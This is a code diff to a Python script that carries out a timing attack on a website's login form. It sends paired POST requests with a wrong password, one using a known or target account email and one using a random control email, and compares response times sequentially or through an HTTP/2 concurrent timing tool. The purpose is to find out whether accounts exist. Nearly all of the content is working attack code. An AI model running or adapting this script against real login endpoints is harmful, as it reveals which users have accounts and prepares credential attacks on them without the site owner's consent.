@@ -4,26 +4,28 @@ import random
 import string
 import os
 import sys
-
 import requests
 import time
 
-
-def measure_response_time(url, data=None):
+def measure_response_time(url, data=None, cert_path='/etc/ca-certificates/trust-source/anchors/myCA.crt'):
     start_time = time.time_ns()  # Start time in nanoseconds
-    response = requests.post(url, data=data)  # Send POST request
+    response = requests.post(
+        url, 
+        data=data,
+        verify=cert_path
+    )
     end_time = time.time_ns()    # End time in nanoseconds
     elapsed_time_ns = end_time - start_time
-    elapsed_time = elapsed_time_ns / 1_000_000_000  # Convert to seconds
-    return elapsed_time, response.status_code
+    # elapsed_time = elapsed_time_ns / 1_000_000_000  # Convert to seconds
+    return elapsed_time_ns, response.status_code
 
-def run_timing_attack(target_url, attempts=10, data=None):
-    times = []
-    for _ in range(attempts):
-        elapsed_time, status_code = measure_response_time(target_url, data=data)
-        print(f"Request took {elapsed_time:.6f} seconds, status code: {status_code}")
-        times.append(elapsed_time)
-    return times
+# def run_timing_attack(target_url, attempts=10, data=None):
+#     times = []
+#     for _ in range(attempts):
+#         elapsed_time, status_code = measure_response_time(target_url, data=data)
+#         print(f"Request took {elapsed_time:.6f} seconds, status code: {status_code}")
+#         times.append(elapsed_time)
+#     return times
 
 async def attack():
     target_url = sys.argv[1]
@@ -39,44 +41,42 @@ async def attack():
     if activity_type == "control":
         post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'
     else:
-        post_data = 'password=12345789abc&email=' + 
+        post_data = 'password=12345789abc&email=' + target_account_email
 
     # This has to be the email known by the hacker to be existing on the site. But the password must be wrong.
     post_data2 = 'password=12345789abc&email=' + known_account_email
     
-    r1 = H2Request(
-        'POST', 
-        target_url, 
-        {
-            'content-length': str(len(post_data)),
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }, 
-        post_data
-    )
+    headers = {
+        'content-length': str(len(post_data)),
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
 
-    r2 = H2Request(
-        'POST', 
-        target_url, 
-        {
-            'content-length': str(len(post_data2)),
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }, 
-        post_data2
-    )
+    headers2 = {
+        'content-length': str(len(post_data2)),
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    r1 = H2Request('POST', target_url, headers, post_data)
+    r2 = H2Request('POST', target_url, headers2, post_data2)
     
     num_request_pairs = 5
     
     safety_margin = num_request_pairs / 5
     
+    output = ''
+
     if (sys.argv[6] == "sequential"):
         for i in range(num_request_pairs):
-            payload = {"key": "value"}  # Replace with your POST data if needed
-            timings = run_timing_attack(target_url, data=payload)
+            timings = measure_response_time(target_url, data=post_data)
+            timings2 = measure_response_time(target_url, data=post_data2)
+            output = output + str(timings[0] - timings2[0]) + ',' + str(timings[1]) + ',' + str(timings2[1]) + '\n'
+        
     else:
-        async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:
-            results = await h2t.run_attack()
+        async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:            
+            results = await h2t.run_attack()             
             output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
-            num = output.count('-')
+    
+    num = output.count('-')
 
     print(output)
     # print((num / num_request_pairs) * 100)
